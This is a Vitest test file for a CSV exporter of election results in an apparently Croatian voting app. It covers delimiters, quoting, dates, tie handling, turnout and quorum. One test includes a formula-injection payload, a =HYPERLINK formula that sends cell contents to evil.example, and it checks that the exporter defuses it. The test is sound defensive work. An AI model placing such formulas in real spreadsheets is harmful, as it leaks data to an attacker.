import { describe, expect, it } from "vitest";
import { CSV_BOM, delimiterFor } from "@/lib/csv";
import {
  buildResultsCsv,
  resultsExportLabels,
  type ResultsExportData,
} from "@/lib/results-export";

const labels = resultsExportLabels("hr");
const SEMI = delimiterFor("hr");

const data = (over: Partial<ResultsExportData> = {}): ResultsExportData => ({
  orgName: "Sveučilište u Zagrebu",
  title: "Izbori za studentski zbor",
  electionType: "STANDARD",
  votingType: "SINGLE_CHOICE",
  opens: "2026-07-01T08:00:00.000Z",
  closes: "2026-07-15T20:00:00.000Z",
  voters: 285,
  votesCast: 168,
  quorumThreshold: null,
  options: [
    { id: "a", text: "Ana Horvat", description: "Predsjednica", votes: 96 },
    { id: "b", text: "Marko Kovač", description: null, votes: 51 },
    { id: "c", text: "Ivana Novak", description: "Blagajnica", votes: 21 },
  ],
  ...over,
});

const lines = (csv: string) => csv.split("\r\n");
// Redak po oznaci iz prvog stupca.
const row = (csv: string, label: string) =>
  lines(csv).find((l) => l.startsWith(`${label}${SEMI}`));

describe("buildResultsCsv — format", () => {
  it("starts with the BOM and a matching sep= line", () => {
    const csv = buildResultsCsv(data(), labels, SEMI);
    expect(csv.startsWith(`${CSV_BOM}sep=;\r\n`)).toBe(true);
  });

  it("uses the locale delimiter", () => {
    const en = resultsExportLabels("en");
    const csv = buildResultsCsv(data(), en, delimiterFor("en"));
    expect(csv.startsWith(`${CSV_BOM}sep=,\r\n`)).toBe(true);
    expect(csv).toContain("Candidate,Role,Votes,Share");
  });

  it("quotes a field containing the delimiter", () => {
    const csv = buildResultsCsv(
      data({ title: "Izbori; ponovljeni" }),
      labels,
      SEMI,
    );
    expect(csv).toContain(`Izbori${SEMI}"Izbori; ponovljeni"`);
  });

  // Napad iz sigurnosnog pregleda 2026-08-02: naslov i ime kandidata piše
  // administrator, a datoteku otvara revizor. Test dokazuje da izvoz stvarno
  // prolazi kroz csvField(), a ne samo da csvField() zna zaštititi ćeliju.
  it("neutralises a formula in an admin-controlled cell", () => {
    const attack = '=HYPERLINK("https://evil.example/?d="&A1,"Rezultati")';
    const csv = buildResultsCsv(
      data({
        title: "=1+1",
        options: [{ id: "a", text: attack, description: "-Uloga", votes: 1 }],
      }),
      labels,
      SEMI,
    );
    expect(row(csv, "Izbori")).toBe("Izbori;'=1+1");
    expect(csv).toContain(`"'${attack.replace(/"/g, '""')}";'-Uloga`);
    // Nijedna ćelija ne smije početi okidačem.
    for (const line of lines(csv).slice(1)) {
      for (const cell of line.split(SEMI)) {
        expect(cell.replace(/^"/, "")).not.toMatch(/^[=+\-@\t\r]/);
      }
    }
  });

  it("separates the header block from the candidate table with a blank line", () => {
    const csv = buildResultsCsv(data(), labels, SEMI);
    const all = lines(csv);
    const header = all.indexOf("Kandidat;Uloga;Glasova;Postotak");
    expect(all[header - 1]).toBe("");
  });

  it("writes ISO dates", () => {
    const csv = buildResultsCsv(data(), labels, SEMI);
    expect(row(csv, "Otvoreno")).toBe("Otvoreno;2026-07-01");
    expect(row(csv, "Zatvoreno")).toBe("Zatvoreno;2026-07-15");
  });

  it("localises the type row instead of printing raw enums", () => {
    const csv = buildResultsCsv(data(), labels, SEMI);
    expect(row(csv, "Vrsta")).toBe("Vrsta;Standardni · Jedan izbor");
    expect(csv).not.toContain("STANDARD");
  });
});

describe("buildResultsCsv — candidate table", () => {
  it("keeps ballot order, not vote order", () => {
    const csv = buildResultsCsv(
      data({
        options: [
          { id: "a", text: "Prvi na listiću", description: null, votes: 1 },
          { id: "b", text: "Drugi na listiću", description: null, votes: 99 },
        ],
      }),
      labels,
      SEMI,
    );
    const all = lines(csv);
    expect(all.findIndex((l) => l.startsWith("Prvi na listiću"))).toBeLessThan(
      all.findIndex((l) => l.startsWith("Drugi na listiću")),
    );
  });

  it("leaves a null role empty, never the string null", () => {
    const csv = buildResultsCsv(data(), labels, SEMI);
    expect(row(csv, "Marko Kovač")).toBe("Marko Kovač;;51;30%");
    expect(csv).not.toContain("null");
  });

  it("divides by ballots cast, so multi-choice shares exceed 100%", () => {
    // 3 listića, 2 opcije s po 2 glasa → 67 % + 67 % = 134 %.
    const csv = buildResultsCsv(
      data({
        votingType: "MULTI_CHOICE",
        votesCast: 3,
        voters: 10,
        options: [
          { id: "a", text: "A", description: null, votes: 2 },
          { id: "b", text: "B", description: null, votes: 2 },
        ],
      }),
      labels,
      SEMI,
    );
    expect(row(csv, "A")).toBe("A;;2;67%");
    expect(row(csv, "B")).toBe("B;;2;67%");
  });

  it("renders the header alone when an election has no candidates", () => {
    const csv = buildResultsCsv(data({ options: [] }), labels, SEMI);
    const all = lines(csv);
    expect(all[all.length - 1]).toBe("Kandidat;Uloga;Glasova;Postotak");
  });
});

// Tri oblika pobjednika — slučaj izjednačenja hvata povratak na `ranked[0]`.
describe("buildResultsCsv — winner", () => {
  it("names the single leader", () => {
    const csv = buildResultsCsv(data(), labels, SEMI);
    expect(row(csv, "Pobjednik")).toBe("Pobjednik;Ana Horvat");
    expect(csv).not.toContain("Pobjednik (izjednačeni)");
  });

  it("marks a tie and names every tied candidate", () => {
    const csv = buildResultsCsv(
      data({
        votesCast: 14,
        options: [
          { id: "a", text: "Ana Horvat", description: null, votes: 7 },
          { id: "b", text: "Marko Kovač", description: null, votes: 7 },
          { id: "c", text: "Ivana Novak", description: null, votes: 0 },
        ],
      }),
      labels,
      SEMI,
    );
    expect(row(csv, "Pobjednik")).toBe("Pobjednik;Izjednačeno");
    expect(csv).toContain("Pobjednik (izjednačeni);Ana Horvat");
    expect(csv).toContain("Pobjednik (izjednačeni);Marko Kovač");
    expect(csv).not.toContain("Pobjednik (izjednačeni);Ivana Novak");
  });

  it("declares no winner when nobody voted", () => {
    const csv = buildResultsCsv(
      data({
        votesCast: 0,
        options: [
          { id: "a", text: "Ana Horvat", description: null, votes: 0 },
          { id: "b", text: "Marko Kovač", description: null, votes: 0 },
        ],
      }),
      labels,
      SEMI,
    );
    expect(row(csv, "Pobjednik")).toBe("Pobjednik;Nema pobjednika");
    expect(csv).not.toContain("Izjednačeno");
  });
});

describe("buildResultsCsv — turnout and quorum", () => {
  it("prints turnout once, as a whole percent", () => {
    const csv = buildResultsCsv(data(), labels, SEMI);
    expect(row(csv, "Ukupno birača")).toBe("Ukupno birača;285");
    expect(row(csv, "Predano glasova")).toBe("Predano glasova;168");
    expect(row(csv, "Konačna izlaznost")).toBe("Konačna izlaznost;59%");
  });

  it("omits every quorum row when no threshold is configured", () => {
    const csv = buildResultsCsv(data(), labels, SEMI);
    expect(csv).not.toContain("Kvorum");
  });

  it("reports a met quorum with required and achieved figures", () => {
    const csv = buildResultsCsv(
      data({ quorumThreshold: 50 }),
      labels,
      SEMI,
    );
    expect(row(csv, "Kvorum")).toBe("Kvorum;Ispunjen");
    expect(row(csv, "Kvorum (potrebno)")).toBe("Kvorum (potrebno);50% (143)");
    expect(row(csv, "Kvorum (postignuto)")).toBe(
      "Kvorum (postignuto);59% (168)",
    );
  });

  it("reports an unmet quorum", () => {
    const csv = buildResultsCsv(data({ quorumThreshold: 95 }), labels, SEMI);
    expect(row(csv, "Kvorum")).toBe("Kvorum;Nije ispunjen");
  });
});

describe("resultsExportLabels", () => {
  it("reuses the on-screen labels so the file and the page agree", () => {
    const hr = resultsExportLabels("hr");
    expect(hr.org).toBe("Organizacija");
    expect(hr.turnout).toBe("Konačna izlaznost");
    expect(hr.winner).toBe("Pobjednik");
  });

  it("carries a locale-specific file suffix", () => {
    expect(resultsExportLabels("hr").fileSuffix).toBe("rezultati");
    expect(resultsExportLabels("en").fileSuffix).toBe("results");
  });
});
